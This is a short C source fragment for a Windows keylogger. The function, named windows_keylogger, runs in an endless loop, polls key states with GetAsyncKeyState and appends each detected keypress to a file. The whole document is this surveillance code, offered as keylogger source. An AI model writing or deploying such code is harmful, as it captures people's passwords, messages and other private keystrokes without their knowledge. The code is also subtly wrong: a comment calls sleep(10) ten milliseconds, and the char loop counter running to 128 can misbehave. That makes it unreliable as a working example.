#include <stdio.h>
#include <unistd.h>

#ifdef _WIN32
#include <windows.h>

    void windows_keylogger(FILE* file, char key, const char* ascii_table[])
    {
        while (1)
        {
            sleep(10); // Wait for 10 ms.
            for(key = 8; key <= 128; key++) // In ASCII, number 8 refers to the backspace char, and number 128 who is the DEL.
            {
                if(GetAsyncKeyState(key) == -32767) { // If a key is pressed put it on the file.
                    fprintf(file, "%s", ascii_table[key]);
                }
            }
        }
    }
#endif